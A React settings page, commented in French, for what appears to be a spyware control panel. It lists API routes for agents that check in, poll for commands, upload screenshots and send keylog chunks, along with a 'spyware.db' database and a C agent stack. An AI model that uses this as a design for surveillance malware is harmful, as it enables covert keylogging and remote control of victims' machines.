import { Server, Globe, Cpu, Code2 } from 'lucide-react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Badge } from '@/components/ui/badge'
import { Separator } from '@/components/ui/separator'
import { cn } from '@/lib/utils'

// Routes de l'API backend
const API_ROUTES = [
  { method: 'GET',  path: '/api/machines',                      description: 'Liste toutes les machines' },
  { method: 'POST', path: '/api/machines/report',               description: 'Check-in initial de l\'agent' },
  { method: 'GET',  path: '/api/machines/:id',                  description: 'Détails d\'une machine' },
  { method: 'GET',  path: '/api/machines/:id/command',          description: 'Agent poll la commande en attente' },
  { method: 'POST', path: '/api/machines/:id/command',          description: 'Frontend envoie une commande' },
  { method: 'GET',  path: '/api/machines/:id/result',           description: 'Frontend récupère le résultat' },
  { method: 'POST', path: '/api/machines/:id/result',           description: 'Agent envoie le résultat' },
  { method: 'POST', path: '/api/machines/:id/upload',           description: 'Agent upload un fichier (screenshot, zip)' },
  { method: 'POST', path: '/api/machines/:id/keylog',           description: 'Agent envoie un chunk de keylog' },
  { method: 'GET',    path: '/api/machines/:id/download/:file',   description: 'Frontend télécharge un fichier' },
  { method: 'DELETE', path: '/api/machines/:id',                  description: 'Frontend supprime une machine' },
]

// Stack technique utilisée dans le projet
const TECH_STACK = [
  {
    category: 'Frontend',
    icon: Code2,
    items: ['React 19', 'Vite 8', 'Tailwind CSS v4', 'shadcn/ui', 'React Router v7'],
  },
  {
    category: 'Backend',
    icon: Server,
    items: ['Python', 'Flask 3', 'SQLite', 'flask-cors'],
  },
  {
    category: 'Agent (C)',
    icon: Cpu,
    items: ['MinGW / GCC', 'libcurl', 'Winsock2', 'GDI32'],
  },
]

// Badge coloré pour la méthode HTTP (GET = bleu, POST = vert)
function MethodBadge({ method }) {
  return (
    <Badge
      variant="outline"
      className={cn(
        'font-mono text-[10px] px-1.5 flex-shrink-0',
        method === 'GET'    ? 'border-blue-500/30 bg-blue-500/10 text-blue-400'
          : method === 'DELETE' ? 'border-red-500/30 bg-red-500/10 text-red-400'
          : 'border-green-500/30 bg-green-500/10 text-green-400'
      )}
    >
      {method}
    </Badge>
  )
}

export default function Settings() {
  return (
    <div className="flex flex-col gap-6 p-6 max-w-2xl">

      <div>
        <h1 className="text-xl font-semibold">Settings</h1>
        <p className="mt-1 text-sm text-muted-foreground">
          Référence de configuration et documentation du projet
        </p>
      </div>

      {/* URLs et ports du projet */}
      <Card>
        <CardHeader className="pb-3">
          <div className="flex items-center gap-2">
            <Server className="h-4 w-4 text-muted-foreground" />
            <div>
              <CardTitle className="text-sm">Configuration serveur</CardTitle>
              <CardDescription className="text-xs">URLs et chemins de fichiers</CardDescription>
            </div>
          </div>
        </CardHeader>
        <CardContent className="space-y-1">
          {[
            { label: 'Backend (API)',   value: 'http://localhost:5000' },
            { label: 'Frontend (dev)', value: 'http://localhost:5173' },
            { label: 'Base de données', value: 'spyware.db (SQLite)' },
          ].map(({ label, value }) => (
            <div
              key={label}
              className="flex items-center justify-between rounded-lg px-2 py-1.5 hover:bg-muted/40 transition-colors"
            >
              <span className="text-xs text-muted-foreground">{label}</span>
              <code className="rounded-md bg-muted px-2 py-0.5 text-xs font-mono">{value}</code>
            </div>
          ))}
        </CardContent>
      </Card>

      {/* Routes de l'API */}
      <Card>
        <CardHeader className="pb-3">
          <div className="flex items-center gap-2">
            <Globe className="h-4 w-4 text-muted-foreground" />
            <div>
              <CardTitle className="text-sm">Routes API</CardTitle>
              <CardDescription className="text-xs">Endpoints REST disponibles</CardDescription>
            </div>
          </div>
        </CardHeader>
        <CardContent className="space-y-1">
          {API_ROUTES.map(({ method, path, description }, index) => (
            <div key={path}>
              {index > 0 && <Separator className="my-1" />}
              <div className="flex items-center gap-3 rounded-lg px-2 py-2 hover:bg-muted/40 transition-colors">
                <MethodBadge method={method} />
                <code className="flex-1 text-xs font-mono">{path}</code>
                <span className="text-xs text-muted-foreground">{description}</span>
              </div>
            </div>
          ))}
        </CardContent>
      </Card>

      {/* Stack technique */}
      <Card>
        <CardHeader className="pb-3">
          <div className="flex items-center gap-2">
            <Cpu className="h-4 w-4 text-muted-foreground" />
            <div>
              <CardTitle className="text-sm">Stack technique</CardTitle>
              <CardDescription className="text-xs">Technologies utilisées dans le projet</CardDescription>
            </div>
          </div>
        </CardHeader>
        <CardContent className="space-y-5">
          {TECH_STACK.map(({ category, icon: Icon, items }, index) => (
            <div key={category}>
              {index > 0 && <Separator className="mb-4" />}
              <div className="flex items-center gap-2 mb-2.5">
                <Icon className="h-3.5 w-3.5 text-muted-foreground" />
                <p className="text-[11px] font-semibold uppercase tracking-widest text-muted-foreground">
                  {category}
                </p>
              </div>
              <div className="flex flex-wrap gap-1.5">
                {items.map((item) => (
                  <Badge key={item} variant="secondary" className="text-xs font-normal">
                    {item}
                  </Badge>
                ))}
              </div>
            </div>
          ))}
        </CardContent>
      </Card>

    </div>
  )
}
